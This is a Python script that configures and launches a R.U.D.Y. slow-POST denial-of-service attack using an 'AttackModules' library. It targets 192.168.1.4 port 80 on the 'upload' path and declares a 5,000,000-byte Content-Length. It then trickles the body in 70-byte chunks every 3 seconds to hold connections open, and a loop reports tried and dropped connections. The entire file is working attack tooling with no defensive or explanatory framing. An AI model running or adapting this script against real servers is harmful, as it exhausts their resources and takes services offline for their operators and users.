from AttackModules import ThreadMaker, RudyConnection
from time import sleep
import threading

target = "192.168.1.4"
port = 80
thread_count = 1 
uri = "upload"
content_len = 5000000
chunksize = 70
timeInterval = 3


headers = {   
            'Host':str(target)+':'+str(port),
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'multipart/form-data; boundary=---------------------------753615180560430119613140835', #do not change this 
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Content-Length': content_len,
            #'Origin': 'http://'+str(target)+':'+str(port),
            #'Referer': 'http://'+str(target)+':'+str(port)+'/',
            }




rd = RudyConnection()
f = rd.create_slowconnection_single
arguments = {}
arguments['target'] = target
arguments['port'] = port
arguments['uri'] = uri 
arguments['chunksize'] = chunksize
arguments['timeinterval'] = timeInterval
arguments['headers'] = headers 
    

ce = ThreadMaker()
#t = threading.Thread(target=fn, args=(arguments, i))
m = ce.lunch
t = threading.Thread(target=m, args=(f, arguments, thread_count, ))
t.start()


count = 0
while True:
    print(str(count)+"---------- tried connection: " + str(rd.tried_connection) + "  --------- dropped connections: " + str(rd.dropped_connection))
    count+=1
    sleep(0.5)
